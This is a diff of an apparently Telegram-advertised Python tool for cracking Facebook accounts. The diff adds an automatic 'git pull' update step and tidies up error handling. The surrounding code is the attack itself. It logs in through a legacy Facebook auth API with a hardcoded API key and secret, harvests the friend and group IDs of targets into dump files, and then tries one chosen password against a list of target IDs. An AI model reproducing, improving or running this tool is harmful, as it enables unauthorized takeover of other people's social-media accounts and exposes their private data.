@@ -14,17 +14,19 @@ banner=("""%s
  _\ \/ / /|_/ / _  / _/	  %sContact: t.me/kang_nuubi%s
 /___/_/_/  /_/____/_/     %sversion: %s3.0%s
 """%(c,g,c,g,c,g,y,w))
-
-os.system('clear')
-print(banner)
-try:
-	os.mkdir('toket')
-except OSError: pass
+print("[!] Checking update")
+os.system('git pull')
+time.sleep(3)
 try:
 	toket=open('toket/token.txt')
 	toket.close()
 except IOError:
 		try:
+			os.system('clear')
+			print(banner)
+			try:
+				os.mkdir('toket')
+			except OSError: pass
 			print('[!] login to your facebook account first');id = input('[?] Username : ');pwd = input('[?] Password : ');API_SECRET = '62f8ce9f74b12f84c123cc23437a4a32';data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"};sig = ('api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.0'+API_SECRET).encode('utf-8')
 			x = hashlib.new('md5')
 			x.update(sig)
@@ -41,6 +43,8 @@ except IOError:
 			print("[!] failed generate access token")
 			print("[!] Check your username/password")
 			exit()
+		except (KeyboardInterrupt,EOFError):
+			exit("\n[!] Key interrupt: exit.")
 
 def getFid():
 	print(banner)
@@ -60,7 +64,7 @@ def getFid():
 		print("[!] file saved: dump/friends_%s_id.txt"%(id))
 		b.close()
 		exit()
-	except KeyboardInterrupt:
+	except (KeyboardInterrupt,EOFError):
 		exit("[!] Key interrupt: Stoped.")
 	except KeyError:
 		os.remove('dump/friends_'+str(id)+'_id.txt')
@@ -84,7 +88,7 @@ def getGid():
 		print("[!] file saved: dump/group_%s_id.txt"%(id))
 		b.close()
 		exit()
-	except KeyboardInterrupt:
+	except (KeyboardInterrupt,EOFError):
 		exit("[!] Key interrupt: Stoped.")
 	except KeyError:
 		os.remove('dump/group_'+str(id)+'_id.txt')
@@ -160,9 +164,7 @@ else:
 try:
         file=open(input("[in] Id List Target: ")).read().splitlines()
         pas=input("[in] Password to Crack: ")
-except KeyboardInterrupt:
-        exit("%s\n[!] Key interrupt: Exiting."%(r))
-except EOFError:
+except (KeyboardInterrupt,EOFError):
         exit("%s\n[!] Key interrupt: Exiting."%(r))
 except FileNotFoundError:
         exit("%s\n[!] File not found: Exiting."%(r))
